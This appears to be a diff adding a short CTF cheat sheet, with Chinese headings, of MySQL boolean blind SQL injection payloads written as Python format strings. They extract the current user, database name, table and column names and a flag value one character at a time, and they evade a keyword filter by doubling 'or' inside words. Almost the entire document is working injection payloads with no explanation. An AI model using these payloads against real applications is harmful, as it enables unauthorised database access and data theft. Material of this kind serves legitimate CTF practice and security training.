@@ -1,0 +1,17 @@
+python 字典
+guess = string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation 
+爆破用户名长度
+payload = "0'oorr((length(user()))=%s)oorr'0"%(x)
+爆破用户名
+payload = "0'oorr((mid((user())from(%s)foorr(1)))='%s')oorr'0"%(x+1,y)
+爆破数据库长度
+payload = "0'oorr((length(database()))=%s)oorr'0"%(x)
+爆破数据库名
+payload = "0'oorr((mid((database())from(%s)foorr(1)))='%s')oorr'0"%(x+1, y)
+爆破表名
+payload="0'oorr((select(mid(group_concat(table_name)from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)='ctf_sql_bool_blind')='%s')oorr'0"%(x+1,y)
+爆破字段
+ payload="0'oorr((select(mid(group_concat(column_name)from(%s)foorr(1)))from(infoorrmation_schema.columns)where(table_name)='fiag')='%s')oorr'0"%(x+1,y)
+爆破数据
+payload = "0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='%s')oorr'0" % (x + 1, y)
+ 
